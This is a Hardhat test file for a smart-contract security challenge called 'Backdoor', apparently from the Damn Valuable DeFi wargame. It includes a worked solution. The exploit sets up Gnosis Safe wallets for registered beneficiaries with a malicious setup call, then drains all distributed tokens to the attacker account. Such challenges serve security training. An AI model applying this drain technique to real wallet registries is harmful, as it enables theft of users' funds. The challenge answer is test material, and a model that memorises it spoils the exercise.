const { ethers } = require('hardhat');
const { expect } = require('chai');
const { resetAccounts } = require('../utils/reset');

describe('[Challenge] Backdoor', function () {
  let deployer, users, attacker;

  const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

  before(async function () {
    await resetAccounts();
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address]

    // Deploy Gnosis Safe master copy and factory contracts
    this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
    this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
    this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    // Deploy the registry
    this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
      this.masterCopy.address,
      this.walletFactory.address,
      this.token.address,
      users
    );

    // Users are registered as beneficiaries
    for (let i = 0; i < users.length; i++) {
      expect(
        await this.walletRegistry.beneficiaries(users[i])
      ).to.be.true;
    }

    // Transfer tokens to be distributed to the registry
    await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    function abiEncodeWithSignature(signature, ...params) { // similar to abi.encodeWithSignature in Solidity
      const functionName = signature.split("(")[0].replace("function", "").trim();
      return (new ethers.utils.Interface([signature])).encodeFunctionData(functionName, params);
    }

    const attackerContract = await (await ethers.getContractFactory("AttackerC11")).deploy(this.token.address);

    const exploitData = abiEncodeWithSignature(
      "function exploit(uint256)",
      ethers.utils.parseEther("10")         // amount
    );

    const promises = [];
    for (let user of users) {
      const initializer = abiEncodeWithSignature(
        "function setup(address[],uint256,address,bytes,address,address,uint256,address)",
        [user],                           // _owners
        1,                                // _threshold
        attackerContract.address,         // to
        exploitData,                      // data
        ethers.constants.AddressZero,     // fallbackHandler
        ethers.constants.AddressZero,     // paymentToken
        0,                                // payment
        ethers.constants.AddressZero      // paymentReceiver 
      );

      promises.push(
        this.walletFactory.createProxyWithCallback(
          this.masterCopy.address,      // _singleton
          initializer,                  // initializer
          0,                            // saltNonce
          this.walletRegistry.address   // callback
        )
      );
    }

    const txns = await Promise.all(promises);
    const waitedTxn = await Promise.all(txns.map(txn => txn.wait()));
    const events = waitedTxn.map(wt => wt.events.find(e => e.event == "ProxyCreation"));

    const walletProxiesCreated = events.map(e => e.args.proxy);

    for (let proxy of walletProxiesCreated) {
      await this.token.transferFrom(proxy, attacker.address, ethers.utils.parseEther("10"));
    }

  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    for (let i = 0; i < users.length; i++) {
      let wallet = await this.walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

      // User is no longer registered as a beneficiary
      expect(
        await this.walletRegistry.beneficiaries(users[i])
      ).to.be.false;
    }

    // Attacker must have taken all tokens
    expect(
      await this.token.balanceOf(attacker.address)
    ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
  });
});
